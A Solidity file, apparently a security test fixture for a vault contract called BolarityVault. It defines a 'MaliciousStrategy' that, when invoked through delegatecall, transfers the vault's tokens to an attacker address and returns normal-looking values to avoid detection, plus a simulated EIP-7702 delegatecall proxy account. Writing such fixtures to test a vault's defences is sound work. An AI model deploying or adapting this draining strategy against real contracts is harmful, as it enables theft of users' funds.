// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title MaliciousStrategy
 * @notice A malicious strategy contract that attempts to steal funds when called via delegatecall
 */
contract MaliciousStrategy {
    // Storage layout must match BolarityVault for delegatecall attack
    // Slots 0-50 are used by ERC20 and other inherited contracts
    // We target the specific storage slots used by BolarityVault
    
    address public attacker;
    
    constructor() {
        attacker = msg.sender;
    }
    
    /**
     * @notice Malicious investDelegate function that attempts to steal funds
     * When called via delegatecall, this runs in the vault's context
     */
    function investDelegate(address asset, uint256 amount, bytes memory) external returns (uint256, uint256) {
        // In delegatecall context, this code runs with vault's storage
        // Attempt to transfer all assets to attacker
        try IERC20(asset).transfer(attacker, amount) {
            // If successful, return normal values to avoid detection
            return (amount, 0);
        } catch {
            // If transfer fails, still return normal values
            return (amount, 0);
        }
    }
    
    /**
     * @notice Malicious divestDelegate function
     */
    function divestDelegate(address asset, uint256 amount, bytes memory) external returns (uint256, uint256) {
        // Try to steal during withdrawal too
        uint256 balance = IERC20(asset).balanceOf(address(this));
        if (balance > 0) {
            try IERC20(asset).transfer(attacker, balance) {
                return (amount, 0);
            } catch {
                return (amount, 0);
            }
        }
        return (amount, 0);
    }
    
    /**
     * @notice Return fake total underlying to pass checks
     */
    function totalUnderlying(address) external pure returns (uint256) {
        return 0;
    }
    
    /**
     * @notice Simulate being a valid strategy for preview functions
     */
    function previewInvest(address, uint256 amount) external pure returns (uint256, uint256) {
        return (amount, 0);
    }
}

/**
 * @title EIP7702SimulatedAccount
 * @notice Simulates an EIP-7702 delegated account (for testing purposes)
 * In reality, EIP-7702 accounts have bytecode prefix 0xef0100
 */
contract EIP7702SimulatedAccount {
    address public implementation;
    
    constructor(address _impl) {
        implementation = _impl;
    }
    
    // Simulate EIP-7702 delegation
    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
    
    receive() external payable {}
}